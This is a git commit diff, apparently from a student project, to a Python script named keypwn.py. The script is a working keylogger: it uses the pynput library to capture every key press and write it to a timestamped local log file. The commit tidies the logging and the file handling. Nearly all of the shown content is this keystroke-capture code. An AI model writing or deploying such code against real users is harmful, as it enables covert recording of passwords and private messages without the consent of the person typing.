beceaec32258f478620647a1b8341094df1a44be
Its-yayo <a01754574@tec.mx>
2023-05-17 16:49:45 -0600

    Error Path [Errno 22]

--- src/keypwn.py
+++ src/keypwn.py
@@ -6,42 +6,28 @@
 
 """
 
-import os
 import sys
 import datetime
 from pynput.keyboard import Listener
 
 date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-log_name = open(f'keypwn_{date}.txt', 'w+')
-
-os.system('cls')
+log_name = open(f'keypwn_{date}.txt', 'w')
 
 def keypwn(key):
-    global keys, log_name
-
-    keys = str(key).replace("'", "")
+    keys = str(key)
 
     if keys == "'\\x03'":
         log_name.close()
         sys.exit()
-    
+
     if keys == 'Key.enter':
         log_name.write('\n')
     elif keys == 'Key.space':
         log_name.write(' ')
     elif keys == 'Key.backspace':
-        log_name.write(' [Backspace] ')
+        log_name.write('%BORRAR%')
     else:
         log_name.write(keys.replace("'", ""))
     
 with Listener(on_press=keypwn) as listener:
     listener.join()
-
-
-
-    
-    
-
-
-
-
